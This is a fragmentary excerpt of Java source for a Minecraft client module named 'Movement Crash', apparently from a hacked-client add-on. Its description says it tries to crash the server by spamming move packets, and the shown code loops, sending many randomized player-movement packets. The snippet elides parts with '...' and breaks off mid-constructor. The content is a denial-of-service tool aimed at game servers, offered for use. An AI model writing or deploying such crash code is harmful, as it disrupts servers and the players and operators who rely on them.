...
public class MovementCrash extends Module {
    ...
    public MovementCrash() {
        super(MCM4MC.JH_CRASH_CAT, "Movement Crash", "Tries to crash the server by spamming move packets.");
    }
    ...
    private void onTick(TickEvent.Post event) {
        ...
        try {
            ...
            for (int i = 0; i < packets.get(); i++) {
                PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(
                    current_pos.x + getDistributedRandom(1),
                    current_pos.y + getDistributedRandom(1),
                    current_pos.z + getDistributedRandom(1),
                    (float) rndD(90),
                    (float) rndD(180),
                    true,  // onGround
                    true   // hasLook
